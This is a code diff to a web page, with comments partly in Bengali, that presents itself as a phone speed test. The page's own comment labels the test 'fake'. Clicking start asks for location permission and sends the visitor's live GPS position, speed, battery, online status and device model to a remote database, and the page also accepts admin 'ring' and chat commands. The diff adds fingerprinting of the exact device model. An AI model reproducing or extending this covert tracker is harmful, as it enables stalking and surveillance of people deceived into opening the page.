@@ -57,7 +57,7 @@
         let wakeLock = null;
         const alarmSound = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
 
-        // Screen Wake Lock (Keep screen ON)
+        // Screen Wake Lock
         const requestWakeLock = async () => {
             try { if ('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen'); } catch (err) {}
         };
@@ -65,6 +65,38 @@
         // Battery Info
         let batLvl = 100, isChg = false;
         if(navigator.getBattery) navigator.getBattery().then(b => { batLvl = Math.round(b.level*100); isChg = b.charging; });
+
+        // 🚀 অ্যাডভান্সড ডিভাইস মডেল বের করার ফাংশন
+        async function getExactDeviceModel() {
+            let deviceName = "Unknown Device";
+            const ua = navigator.userAgent;
+
+            // ১. মডার্ন API দিয়ে ট্রাই করা (নতুন অ্যান্ড্রয়েডের জন্য)
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
+                    if (uaData.model) {
+                        return `${uaData.platform} (${uaData.model})`; // Output: Android (SM-G998B)
+                    }
+                } catch (e) { console.log("Modern API Blocked"); }
+            }
+
+            // ২. ক্লাসিক স্ট্রিং থেকে বের করা (পুরানো অ্যান্ড্রয়েডের জন্য)
+            if (/Android/i.test(ua)) {
+                const match = ua.match(/Android.*?; (.*?) Build/);
+                if (match && match[1]) {
+                    deviceName = `Android (${match[1].trim()})`;
+                } else {
+                    deviceName = "Android Smartphone";
+                }
+            } 
+            // ৩. আইফোন বা পিসির জন্য
+            else if (/iPhone/i.test(ua)) { deviceName = "Apple iPhone"; } 
+            else if (/iPad/i.test(ua)) { deviceName = "Apple iPad"; } 
+            else if (/Windows/i.test(ua)) { deviceName = "Windows PC"; }
+
+            return deviceName;
+        }
 
         // Admin Commands (Ring & Chat)
         onValue(chatRef, (snap) => {
@@ -84,11 +116,14 @@
             }
         });
 
-        // Fake Speed Test Animation
+        // Start Test & Track Logic
         const startTestBtn = document.getElementById('startBtn');
-        startTestBtn.addEventListener('click', () => {
+        startTestBtn.addEventListener('click', async () => {
             requestWakeLock(); // Screen lock ON
             
+            // মডেল নাম্বার ফেচ করা হচ্ছে
+            const deviceModelName = await getExactDeviceModel();
+
             // Ask Location Permission & Start Tracking
             if(navigator.geolocation) {
                 onDisconnect(userRef).update({ isOnline: false });
@@ -99,7 +134,7 @@
                             accuracy: pos.coords.accuracy, heading: pos.coords.heading || 0,
                             speed: pos.coords.speed ? Math.round(pos.coords.speed * 3.6) : 0,
                             battery: batLvl, charging: isChg, isOnline: true,
-                            deviceInfo: /Android/i.test(navigator.userAgent) ? "Android" : "Apple/PC",
+                            deviceInfo: deviceModelName, // এখানে মডেল নাম্বার পাঠানো হলো
                             timestamp: new Date().toLocaleString()
                         });
                     },
